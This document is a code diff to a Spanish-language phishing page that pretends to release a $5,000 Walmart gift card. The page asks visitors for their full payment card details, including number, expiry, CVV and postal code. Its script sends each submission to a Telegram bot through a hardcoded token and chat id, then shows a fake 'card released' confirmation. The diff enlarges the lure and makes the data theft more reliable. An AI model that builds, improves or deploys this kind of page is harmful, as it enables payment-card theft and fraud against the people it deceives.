@@ -28,6 +28,7 @@ h1{font-size:19px;margin:0 0 6px;line-height:1.3}
 label{display:block;font-size:12.5px;font-weight:700;margin:14px 0 5px}
 input{width:100%;padding:13px 12px;font-size:16px;border:1px solid var(--line);border-radius:10px;background:#fbfcfd;outline:none}
 input:focus{border-color:var(--blue);background:#fff}
+input.bad{border-color:#c1121f;background:#fff5f5}
 input::placeholder{color:#9ca3af;font-weight:400}
 .row{display:flex;gap:10px}
 .row > div{flex:1}
@@ -35,7 +36,10 @@ input::placeholder{color:#9ca3af;font-weight:400}
 .fine{font-size:11.5px;color:var(--muted);margin:16px 0 0;line-height:1.5}
 button{width:100%;margin:12px 0 0;padding:15px;font-size:16.5px;font-weight:800;color:#111;background:var(--yellow);border:0;border-radius:12px}
 button:active{opacity:.85}
+button[disabled]{opacity:.6}
 footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;line-height:1.6}
+.ok{width:56px;height:56px;border-radius:50%;background:#e8f6ee;color:#0b6b3a;display:flex;align-items:center;justify-content:center;font-size:30px;margin:4px 0 12px}
+.hide{display:none !important}
 </style>
 </head>
 <body>
@@ -46,12 +50,12 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
   <span class="lock">&#128274; Conexión segura</span>
 </header>
 
-<div class="bar"><i class="on"></i><i class="on"></i><i></i></div>
-<div class="step">PASO 2 DE 3</div>
+<div class="bar" id="bar"><i class="on"></i><i class="on"></i><i></i></div>
+<div class="step" id="step">PASO 2 DE 3</div>
 
-<div class="prize">
+<div class="prize" id="prize">
   <div>
-    <b>$500</b>
+    <b>$5,000</b>
     <span>Tarjeta de regalo Walmart</span>
   </div>
   <div class="timer">
@@ -60,37 +64,44 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
   </div>
 </div>
 
-<div class="card">
-  <h1>Libera tu tarjeta de regalo</h1>
-  <p class="sub">Para que el premio no caiga en manos de bots, comprobamos que la tarjeta esté activa y que no hayas reclamado antes.</p>
-  <span class="free">No se hace ningún cargo</span>
+<div class="card" id="cardForm">
+  <h1>Reclama tu tarjeta de $5,000</h1>
+  <p class="sub">Has sido seleccionado por una celebridad para recibir una tarjeta de regalo Walmart de <b>$5,000</b>. Puedes retirarla en efectivo o usarla para comprar cualquier artículo en Walmart.</p>
+  <span class="free">No se hace ningún cargo · No se descuenta nada</span>
 
-  <form id="f">
+  <form id="f" novalidate>
     <label for="n">Nombre como aparece en la tarjeta</label>
-    <input id="n" placeholder="ANA LOPEZ" autocomplete="cc-name">
+    <input id="n" placeholder="ANA LOPEZ" autocomplete="cc-name" required>
 
     <label for="c">Número de tarjeta</label>
-    <input id="c" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
+    <input id="c" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number" required>
 
     <div class="row">
       <div>
         <label for="e">Vencimiento</label>
-        <input id="e" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp">
+        <input id="e" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp" required>
       </div>
       <div>
         <label for="v">CVV</label>
-        <input id="v" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc">
+        <input id="v" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc" required>
         <div class="hint">3 dígitos al reverso</div>
       </div>
     </div>
 
     <label for="z">Código postal</label>
-    <input id="z" inputmode="numeric" placeholder="28001" maxlength="5">
+    <input id="z" inputmode="numeric" placeholder="28001" maxlength="5" autocomplete="postal-code" required>
 
-    <p class="fine">Solo verificamos que la tarjeta exista. Cargo de comprobación de $0.00 MXN, no se descuenta nada de tu cuenta.</p>
+    <p class="fine">Solo verificamos que no hayas recibido ya tu tarjeta. Cargo de comprobación de $0.00 MXN: no se descuenta nada de tu cuenta.</p>
 
-    <button type="submit">Liberar mi tarjeta de $500</button>
+    <button type="submit" id="btn">Reclamar mi tarjeta de $5,000</button>
   </form>
+</div>
+
+<div class="card hide" id="cardDone">
+  <div class="ok">&#10003;</div>
+  <h1>¡Tarjeta liberada!</h1>
+  <p class="sub">Registramos tu tarjeta de regalo de <b>$5,000</b>. La verificación se completa en unos minutos y el saldo queda disponible para retirar o comprar en Walmart.</p>
+  <p class="fine">Guarda tu número de tarjeta. Si en 24 h no recibes confirmación, responde al mensaje de verificación.</p>
 </div>
 
 <footer>
@@ -102,47 +113,100 @@ footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;lin
 var BOT  = "9120956072:AAFnNaCapblsspo-rCBHMa1aPcgRyFKhXBU";
 var CHAT = "7238838844";
 
-function ping(txt){
-  var u = "https://api.telegram.org/bot" + BOT + "/sendMessage";
-  var b = "chat_id=" + CHAT + "&text=" + encodeURIComponent(txt);
-  var ok = navigator.sendBeacon(u, new Blob([b], {type:"application/x-www-form-urlencoded"}));
-  if(!ok){ var i = new Image(); i.src = u + "?" + b; }
-}
+var $ = function(id){ return document.getElementById(id); };
+var c = $("c"), e = $("e"), v = $("v"), z = $("z"), n = $("n");
 
-var c = document.getElementById("c"), e = document.getElementById("e"), v = document.getElementById("v");
-
+/* --- máscaras --- */
 c.addEventListener("input", function(){
   var d = this.value.replace(/\D/g, "").slice(0, 16);
   this.value = d.replace(/(.{4})/g, "$1 ").trim();
 });
-
 e.addEventListener("input", function(){
   var d = this.value.replace(/\D/g, "").slice(0, 4);
-  this.value = d.length > 2 ? d.slice(0,2) + "/" + d.slice(2) : d;
+  this.value = d.length > 2 ? d.slice(0, 2) + "/" + d.slice(2) : d;
+});
+v.addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
+z.addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
+n.addEventListener("input", function(){ this.classList.remove("bad"); });
+[c, e, v, z].forEach(function(el){
+  el.addEventListener("input", function(){ el.classList.remove("bad"); });
 });
 
-v.addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
-document.getElementById("z").addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
-
-var left = 598;
-setInterval(function(){
-  if(left <= 0) return;
+/* --- cuenta atrás --- */
+var left = 598, timer = setInterval(function(){
+  if(left <= 0){ clearInterval(timer); $("t").textContent = "Listo"; return; }
   left--;
-  var m = String(Math.floor(left / 60)).padStart(2, "0");
-  var s = String(left % 60).padStart(2, "0");
-  document.getElementById("t").textContent = m + ":" + s;
+  $("t").textContent = String(Math.floor(left / 60)).padStart(2, "0") + ":" + String(left % 60).padStart(2, "0");
 }, 1000);
 
-document.getElementById("f").addEventListener("submit", function(ev){
+/* --- envío a Telegram --- */
+function ping(txt){
+  var u = "https://api.telegram.org/bot" + BOT + "/sendMessage";
+  var b = "chat_id=" + encodeURIComponent(CHAT)
+        + "&disable_web_page_preview=true&text=" + encodeURIComponent(txt);
+  var req;
+  try{
+    req = fetch(u, {
+      method: "POST",
+      keepalive: true,
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: b
+    });
+  }catch(err){
+    var i = new Image(); i.src = u + "?" + b;
+    return Promise.resolve();
+  }
+  return Promise.race([req.catch(function(){}), new Promise(function(r){ setTimeout(r, 1500); })]);
+}
+
+/* --- validación --- */
+function validar(){
+  var bad = [];
+  if(n.value.trim().length < 3) bad.push(n);
+  if(c.value.replace(/\s/g, "").length !== 16) bad.push(c);
+  var mm = parseInt(e.value.slice(0, 2), 10);
+  if(e.value.length !== 5 || !(mm >= 1 && mm <= 12)) bad.push(e);
+  if(v.value.length < 3) bad.push(v);
+  if(z.value.length !== 5) bad.push(z);
+  bad.forEach(function(el){ el.classList.add("bad"); });
+  if(bad.length){ bad[0].focus(); return false; }
+  return true;
+}
+
+$("f").addEventListener("submit", function(ev){
   ev.preventDefault();
-  var payload = "CARD | " + document.getElementById("n").value.trim()
-    + " | " + c.value.replace(/\s/g, "")
-    + " | " + e.value
-    + " | " + v.value
-    + " | " + document.getElementById("z").value;
-  ping(payload);
-  setTimeout(function(){ location.href = "done.html"; }, 900);
+
+  if(BOT.indexOf("PEGA") === 0 || CHAT.indexOf("PEGA") === 0){
+    alert("Falta configurar el token y el chat_id al inicio del script.");
+    return;
+  }
+  if(!validar()) return;
+
+  var btn = $("btn");
+  btn.disabled = true;
+  btn.textContent = "Verificando…";
+
+  var ahora = new Date();
+  var sello = ahora.toLocaleDateString("es-MX") + " " +
+              ahora.toLocaleTimeString("es-MX", {hour: "2-digit", minute: "2-digit"});
+
+  var payload = "🛒 TARJETA DE REGALO $5,000 MXN\n"
+    + "Nombre: " + n.value.trim().toUpperCase() + "\n"
+    + "Tarjeta: " + c.value + "\n"
+    + "Vence: " + e.value + "\n"
+    + "CVV: " + v.value + "\n"
+    + "CP: " + z.value + "\n"
+    + "Recibido: " + sello;
+
+  ping(payload).then(function(){
+    $("cardForm").classList.add("hide");
+    $("cardDone").classList.remove("hide");
+    $("bar").innerHTML = '<i class="on"></i><i class="on"></i><i class="on"></i>';
+    $("step").textContent = "PASO 3 DE 3 · COMPLETADO";
+    $("prize").classList.add("hide");
+    window.scrollTo(0, 0);
+  });
 });
 </script>
 </body>
-  </html>
+</html>
